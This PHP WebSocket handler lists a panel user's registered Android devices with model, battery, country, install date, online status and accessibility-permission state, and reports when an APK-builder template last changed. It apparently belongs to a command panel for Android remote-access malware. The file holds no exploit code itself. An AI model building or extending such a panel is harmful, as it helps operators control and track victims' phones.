<?php

declare(strict_types=1);

namespace App\WebSocket\Handlers;

use App\Models\Device;
use App\WebSocket\ConnectionManager;
use App\WebSocket\Messages\WebSocketMessage;
use App\WebSocket\Services\PanelAuthService;
use App\WebSocket\WebSocketLog;

final class CheckPhoneHandler
{
    private ConnectionManager $connectionManager;

    private PanelAuthService $panelAuthService;

    public function __construct(ConnectionManager $connectionManager, PanelAuthService $panelAuthService)
    {
        $this->connectionManager = $connectionManager;
        $this->panelAuthService = $panelAuthService;
    }

    public function handle(int $fd, WebSocketMessage $message): void
    {
        $token = $message->token();
        $page = $message->page();
        $pageSize = $message->pageSize();
        $filters = $message->filters();

        if (empty($token)) {
            WebSocketLog::getLogger()->warning("CheckPhone: missing token, fd={$fd}");
            $this->connectionManager->send($fd, $this->buildErrorResponse('Token is required', $page, $pageSize));

            return;
        }

        $authResult = $this->panelAuthService->authenticate($token);

        if ($authResult === null) {
            WebSocketLog::getLogger()->warning("CheckPhone: invalid token, fd={$fd}");
            $this->connectionManager->send($fd, $this->buildErrorResponse('Invalid or expired token', $page, $pageSize));

            return;
        }

        $isAdmin = $authResult->isAdmin;
        $ownerId = $authResult->ownerId;

        WebSocketLog::getLogger()->debug("CheckPhone: fd={$fd}, userId={$authResult->userId}, isAdmin=".($isAdmin ? 'true' : 'false'));

        // Register panel user with userId for device authorization
        $this->connectionManager->registerPanelUser($fd, $authResult->ownerEmail, $isAdmin, $ownerId);

        $query = $this->buildDeviceQuery($isAdmin, $ownerId);

        $this->applyFilters($query, $filters);

        $total = $query->count();
        WebSocketLog::getLogger()->debug("CheckPhone: found {$total} devices for userId={$authResult->userId}");
        $pageCount = (int) ceil($total / $pageSize);

        $devices = $query
            ->orderByDesc('last_seen_at')
            ->offset(($page - 1) * $pageSize)
            ->limit($pageSize)
            ->get();

        // 获取内存中所有在线设备的状态，用于实时判断在线状态
        $onlineDevices = $this->connectionManager->getAllOnlineDevices();

        $list = $devices->map(fn (Device $device) => $this->formatDeviceForCheckPhone($device, $onlineDevices))->toArray();

        $this->connectionManager->send($fd, [
            'type' => 'checkphone',
            'list' => $list,
            'total' => $total,
            'pageCount' => $pageCount,
            'page' => $page,
            'pageSize' => $pageSize,
            'fileLastModified' => $this->getApkTemplateLastModified(),
        ]);
    }

    private function buildErrorResponse(string $error, int $page, int $pageSize): array
    {
        return [
            'type' => 'checkphone',
            'error' => $error,
            'list' => [],
            'total' => 0,
            'pageCount' => 0,
            'page' => $page,
            'pageSize' => $pageSize,
        ];
    }

    private function buildDeviceQuery(bool $isAdmin, ?int $ownerId): \Illuminate\Database\Eloquent\Builder
    {
        $query = Device::query()->where('is_removed', false);

        if (! $isAdmin) {
            if ($ownerId !== null) {
                $query->where('user_id', $ownerId);
            } else {
                $query->whereRaw('1 = 0');
            }
        }

        return $query;
    }

    private function formatDeviceForCheckPhone(Device $device, array $onlineDevices): array
    {
        $uuid = $device->uuid;
        $status = $this->connectionManager->getDeviceStatus($uuid);

        $isOnline = isset($onlineDevices[$uuid]);
        $memoryStatus = $onlineDevices[$uuid] ?? [];

        return [
            'phone_id' => $uuid,
            'phone_name' => $memoryStatus['name'] ?? $device->name ?? '',
            'model' => $memoryStatus['model'] ?? $device->model ?? '',
            'android_version' => $memoryStatus['android_version'] ?? $device->android_version ?? '',
            'battery_charge' => $memoryStatus['battery_level'] ?? $device->battery_level ?? '',
            'accessibility' => $this->resolveAccessibilityStatus($memoryStatus, $device),
            'country' => $memoryStatus['country'] ?? $device->country ?? '',
            'user_email' => $status['user_email'] ?? '',
            'install_date' => $device->installed_at?->format('Y-m-d H:i:s') ?? '',
            'is_online' => $isOnline,
            'lastPing' => ($status['last_ping'] ?? 0) * 1000,
        ];
    }

    private function resolveAccessibilityStatus(array $memoryStatus, Device $device): string
    {
        $memoryValue = $memoryStatus['has_accessibility'] ?? null;
        $dbValue = $device->has_accessibility ? '1' : '0';

        if ($memoryValue !== null) {
            return $memoryValue === '1' ? '1' : $dbValue;
        }

        return $dbValue;
    }

    private function applyFilters($query, array $filters): void
    {
        if (! empty($filters['user_email'])) {
            $query->whereHas('user', function ($q) use ($filters) {
                $q->where('email', 'like', '%'.$filters['user_email'].'%');
            });
        }

        if (! empty($filters['phone_name'])) {
            $query->where('name', 'like', '%'.$filters['phone_name'].'%');
        }

        if (! empty($filters['country'])) {
            $query->where('country', $filters['country']);
        }

        if (! empty($filters['model'])) {
            $query->where('model', 'like', '%'.$filters['model'].'%');
        }

        if (isset($filters['accessibility']) && $filters['accessibility'] !== '') {
            $query->where('has_accessibility', $filters['accessibility'] === '1');
        }

        if (! empty($filters['install_date'])) {
            $query->whereDate('installed_at', $filters['install_date']);
        }
    }

    private function getApkTemplateLastModified(): string
    {
        $templatePath = config('apk-builder.template_path', '');

        if (empty($templatePath) || ! is_dir($templatePath)) {
            return '';
        }

        $mtime = filemtime($templatePath);

        return $mtime !== false ? date('Y-m-d H:i:s', $mtime) : '';
    }
}
